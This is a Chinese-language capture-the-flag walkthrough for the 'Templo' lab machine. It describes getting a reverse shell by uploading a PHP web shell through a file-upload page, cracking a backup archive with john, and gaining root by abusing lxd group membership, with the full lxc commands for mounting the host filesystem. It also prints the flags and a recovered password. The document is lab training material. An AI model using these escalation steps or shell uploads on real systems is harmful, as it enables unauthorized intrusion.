# Templo

2025.03.03 https://thehackerslabs.com/templo/

[video](https://www.bilibili.com/video/BV1qm9vYKEc5/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 首页无内容，在源码中发现 `NAMARI lo es todo solo debes probar`。

扫描发现 http://192.168.5.40/wow/clue.txt， 线索 Vamos al /opt ，提示去/opt，但是目前没进入到系统。

访问 NAMARI 目录，上面能上传文件和读取文件，再次对这个目录进行扫描，发现 http://192.168.5.40/NAMARI/uploads/ ， 尝试上传 php web shell 然后访问 http://192.168.5.40/NAMARI/uploads/8888.php 就在 kali 上得到了反弹的 shell。

根据前面线索，进入 /opt 发现 backup.zip，下载到 kali ，john 得到解码密码得到字符串 `6rK5£6iqF;o|8dmla859/_` 应该是 rodgar 用户的密码。

切换用户拿到 user flag：

```
rodgar@TheHackersLabs-Templo:~$ cat user.txt
3e6ae8a53cc7e954a8433af59920dc7e
```

当前用户在 lxd 组中可以利用 lxd 权限提权（不要将镜像文件保存到/tmp 目录，会提示不存在，保存到 rodgar 的 home 目录就可以）：

```
find / -name lxc 2>/dev/null

cd ~
/usr/sbin/lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage
/usr/sbin/lxc image list

/usr/sbin/lxc storage create pool dir
/usr/sbin/lxc profile device add default root disk path=/ pool=pool
/usr/sbin/lxc init lxcimage ignite -c security.privileged=true
/usr/sbin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
/usr/sbin/lxc start ignite
/usr/sbin/lxc exec ignite /bin/sh
```

最后拿到了 root flag：

```
cd /mnt/root
cd root
cat root.txt
63a9f0ea7bb98050796b649e85481845
```
